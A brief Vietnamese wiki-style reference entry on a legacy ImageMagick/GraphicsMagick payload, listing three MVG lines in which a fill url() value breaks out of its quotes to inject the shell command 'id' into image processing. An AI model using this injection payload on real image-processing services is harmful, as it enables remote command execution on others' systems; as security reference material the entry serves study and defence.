---
title: ImageMagick Legacy Payload
type: entity
related: [[Media and Document Pipeline RCE]]
---

Payload legacy được nhắc đến cho ImageMagick/GraphicsMagick:

- `push graphic-context`
- `fill 'url(https://x.tld/a"|id>/tmp/o")'`
- `pop graphic-context`

Nó minh họa khả năng delegate hoặc command execution qua xử lý ảnh.